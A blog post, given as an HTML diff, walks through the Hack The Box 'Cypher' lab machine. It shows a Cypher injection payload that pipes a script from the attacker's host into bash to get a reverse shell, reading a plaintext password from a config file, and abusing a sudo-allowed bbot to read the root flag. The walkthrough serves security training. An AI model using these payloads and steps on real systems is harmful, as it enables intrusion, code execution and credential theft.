@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/07/24/hackthebox-cypher/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewCypher is a medium-difficulty machine from Hack The Box dealing initially with Cypher injection through manipulation of error codes to get us a system shell, later exfiltrating creds to get us">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Cypher">
+<meta property="og:url" content="http://fouedsaidi.com/2025/07/24/Hackthebox-Cypher/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewCypher is a medium-difficulty machine from Hack The Box dealing initially with Cypher injection through manipulation of error codes to get us a system shell, later exfiltrating creds to get us">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cypher/Cypher.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cypher/web.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cypher/web1.png">
+<meta property="article:published_time" content="2025-07-24T10:50:16.000Z">
+<meta property="article:modified_time" content="2025-07-24T17:22:18.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cypher/Cypher.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Cypher -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Cypher</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-24 11:50:16</span>
+        <span class="mobile">2025-07-24 11:50:16</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-24 18:22:18</span>
+            <span class="mobile">2025-07-24 18:22:18</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Cypher is a medium-difficulty machine from Hack The Box dealing initially with Cypher injection through manipulation of error codes to get us a system shell, later exfiltrating creds to get user flag. For privesc, we’ll abuse bbot with the ability to inject our own YARA rules to read the contents of the root flag.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cypher/Cypher.png"
+                      alt="Cypher-info-card"
+                ><figcaption>Cypher-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)</span><br><span class="line">|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.24.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cypher.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+<p>We can see that we have our usual ssh port 22 and a web application deployed on port 80 redirecting us to <code>cypher.htb</code> so let’s add that to our <code>/etc/hosts</code>.</p>
+<h2 id="Web-Application-http-cypher-htb"><a href="#Web-Application-http-cypher-htb" class="headerlink" title="Web Application - http://cypher.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://cypher.htb/" >http://cypher.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>We can see that we have a simple web app with a login functionality:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cypher/web.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>There was no way for me to create an account so I instantly thought of injecting some SQLI payloads, starting with a simple <code>a&#39;</code> as a test:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cypher/web1.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>That returned a really weird and interesting error, you can find the full error below:</p>
+<details>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last): File &quot;/app/app.py&quot;, line 142, in verify_creds results = run_cypher(cypher) File &quot;/app/app.py&quot;, line 63, in run_cypher return [r.data() for r in session.run(cypher)] File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py&quot;, line 314, in run self._auto_result._run( File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 221, in _run self._attach() File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 409, in _attach self._connection.fetch_message() File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner func(*args, **kwargs) File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message res = self._process_message(tag, fields) File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message response.on_failure(summary_metadata or &#123;&#125;) File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure raise Neo4jError.hydrate(**metadata) neo4j.exceptions.CypherSyntaxError: &#123;code: Neo.ClientError.Statement.SyntaxError&#125; &#123;message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 56 (offset: 55)) &quot;MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;a&#x27;&#x27; return h.value as hash&quot; ^&#125; During handling of the above exception, another exception occurred: Traceback (most recent call last): File &quot;/app/app.py&quot;, line 165, in login creds_valid = verify_creds(username, password) File &quot;/app/app.py&quot;, line 151, in verify_creds raise ValueError(f&quot;Invalid cypher query: &#123;cypher&#125;: &#123;traceback.format_exc()&#125;&quot;) ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;a&#x27;&#x27; return h.value as hash: Traceback (most recent call last): File &quot;/app/app.py&quot;, line 142, in verify_creds results = run_cypher(cypher) File &quot;/app/app.py&quot;, line 63, in run_cypher return [r.data() for r in session.run(cypher)] File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py&quot;, line 314, in run self._auto_result._run( File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 221, in _run self._attach() File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 409, in _attach self._connection.fetch_message() File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner func(*args, **kwargs) File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message res = self._process_message(tag, fields) File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message response.on_failure(summary_metadata or &#123;&#125;) File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure raise Neo4jError.hydrate(**metadata) neo4j.exceptions.CypherSyntaxError: &#123;code: Neo.ClientError.Statement.SyntaxError&#125; &#123;message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 56 (offset: 55)) &quot;MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;a&#x27;&#x27; return h.value as hash&quot; ^&#125;</span><br></pre></td></tr></table></figure></div>
+</details>
+
+<p>Concluding from the logs, this is a <a class="link"   target="_blank" rel="noopener" href="https://neo4j.com/docs/cypher-manual/current/introduction/" >neo4j <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> database error, means we’re dealing with <a class="link"   target="_blank" rel="noopener" href="https://neo4j.com/docs/cypher-manual/current/introduction/cypher-neo4j/" >Cypher language <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>I found this really cool blog post with Cypher injection payloads: <a class="link"   target="_blank" rel="noopener" href="https://pentester.land/blog/cypher-injection-cheatsheet/" >https://pentester.land/blog/cypher-injection-cheatsheet/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>To not waste too much time, I used this payload to land a shell on system: </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; return h.value as a UNION CALL custom.getUrlStatusCode(&quot;example.com;curl 10.10.16.24/shell.sh|bash;#&quot;) YIELD statusCode AS a RETURN a;//</span><br></pre></td></tr></table></figure></div>
+
+<p>This payload exploits a query injection by prematurely closing the current string (a’) and appending a UNION CALL to the custom procedure getUrlStatusCode(), which normally retrieves HTTP status codes. Instead of a normal URL, it passes <code>example.com;curl 10.10.16.24/shell.sh|bash;#</code>, where the semicolon injects a shell command that downloads and executes a malicious script from the attacker’s server (curl … | bash), while # comments out any trailing query parts to avoid errors. The YIELD statusCode AS a RETURN a segment ensures the query remains syntactically valid and returns a value, but the real impact is remote code execution on the server running this function.</p>
+<p>And we catch a shell as neo4j user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.24] from (UNKNOWN) [10.129.13.0] 45228</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1409): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">neo4j@cypher:/$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=110(neo4j) gid=111(neo4j) <span class="built_in">groups</span>=111(neo4j)</span><br><span class="line">neo4j@cypher:/$</span><br></pre></td></tr></table></figure></div>
+
+<p>As usual, we start off with some data exfiltration to get some credentials:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">neo4j@cypher:/home/graphasm$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bbot_preset.yml</span><br><span class="line">user.txt</span><br><span class="line">neo4j@cypher:/home/graphasm$ <span class="built_in">cat</span> bbot_preset.yml</span><br><span class="line"><span class="built_in">cat</span> bbot_preset.yml</span><br><span class="line">targets:</span><br><span class="line">  - ecorp.htb</span><br><span class="line"></span><br><span class="line">output_dir: /home/graphasm/bbot_scans</span><br><span class="line"></span><br><span class="line">config:</span><br><span class="line">  modules:</span><br><span class="line">    neo4j:</span><br><span class="line">      username: neo4j</span><br><span class="line">      password: cU4btyib.20xtCMCXkBmerhK</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we do find some credentials that we can use for graphasm user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">neo4j@cypher:/home/graphasm$ su graphasm</span><br><span class="line">su graphasm</span><br><span class="line">Password: cU4btyib.20xtCMCXkBmerhK</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(graphasm) gid=1000(graphasm) <span class="built_in">groups</span>=1000(graphasm)</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">39accdfed86ffdd3a3d3976b6328b3c7</span><br></pre></td></tr></table></figure></div>
+
+<p>And we get our user flag!</p>
+<h2 id="Privilege-Escalation-bbot-abuse"><a href="#Privilege-Escalation-bbot-abuse" class="headerlink" title="Privilege Escalation - bbot abuse"></a>Privilege Escalation - bbot abuse</h2><p>Checking what we can execute as root, we find this interesting bbot binary:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graphasm@cypher:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> graphasm on cypher:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User graphasm may run the following commands on cypher:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/bbot</span><br></pre></td></tr></table></figure></div>
+
+<p>What we can do here is run bbot with a custom YARA rules file (&#x2F;root&#x2F;root.txt) in debug mode and –dry-run, which means it only loads configurations and modules without performing any live scanning. The output confirms that five internal modules (aggregate, cloudcheck, dnsresolve, excavate, speculate) and five output modules (csv, json, python, stdout, txt) were initialized, and custom YARA rules were successfully loaded and it will load us the root flag eventually on the output:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">graphasm@cypher:~$  sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run</span><br><span class="line">  ______  _____   ____ _______</span><br><span class="line"> |  ___ \|  __ \ / __ \__   __|</span><br><span class="line"> | |___) | |__) | |  | | | |</span><br><span class="line"> |  ___ &lt;|  __ &lt;| |  | | | |</span><br><span class="line"> | |___) | |__) | |__| | | |</span><br><span class="line"> |______/|_____/ \____/  |_|</span><br><span class="line"> BIGHUGE BLS OSINT TOOL v2.1.0.4939rc</span><br><span class="line"></span><br><span class="line">www.blacklanternsecurity.com/bbot</span><br><span class="line"></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;stdout&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;output&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;csv&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;output&quot;</span></span><br><span class="line">[DBUG] Preset 